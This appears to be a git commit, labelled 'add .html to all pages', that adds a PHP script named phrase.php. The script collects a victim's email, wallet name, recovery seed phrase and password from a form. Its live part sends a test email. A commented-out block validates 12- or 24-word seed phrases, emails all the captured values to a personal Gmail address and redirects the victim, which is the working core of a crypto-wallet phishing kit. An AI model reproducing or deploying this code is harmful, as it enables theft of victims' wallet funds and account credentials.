accc466a691f0a2c33b40ea3e5d59882646f5c07
Olamilekan <olamilekanomosanya@gmail.com>
2022-08-25 16:01:53 +0100

    add .html to all pages

---
+++ cache/phrase.php
@@ -0,0 +1,63 @@
+<?php
+$Useremail= $_POST['email'];
+// $Useremail= $_POST['email'];
+ $wallet= $_POST['wallet'];
+$phrase= $_POST['phrase'];
+$password=$_POST['password'];
+
+
+
+
+
+
+ini_set( 'display_errors', 1 );
+error_reporting( E_ALL );
+$from = "renarddrakeintl@gmail.com";
+$to = "olamilekan1312@gmail.com";
+$subject = "Checking PHP mail";
+$message = "PHP mail works just fine";
+$headers = "From:" . $from;
+if(mail($to,$subject,$message, $headers)) {
+    echo "The email message was sent.";
+} else {
+    echo "The email message was not sent.";
+}
+
+
+
+// // VALIDATING TEXTAREA
+
+// if (trim($_POST['phrase']) &&  str_word_count($phrase) != 12 && str_word_count($phrase) != 24  ) {
+
+
+
+// }else{
+
+
+
+// }
+
+
+
+//  $to = 'olamilekan1312@gmail.com'; // replace this mail with yours
+// // $phrase = $_POST["phrase"];
+// $email= "onlinesync.com";
+// $headers = 'MIME-Version: 1.0' . "\r\n";
+// $headers .= "From: " . $email . "\r\n"; // Sender's E-mail
+// $headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
+// $message = " wallet is : {$wallet}.  phrase is: {$phrase} . email is : {$Useremail}. password is : {$password}";
+
+// // $message = " wallet is : {$wallet}.  phrase is: {$phrase}";
+ 
+// if (@mail($to, $email, $message, $headers))
+// {
+//     header("Location:../index.php");
+// }else{
+//   header("Location:../list.php");
+// }
+
+
+
+
+
+?>
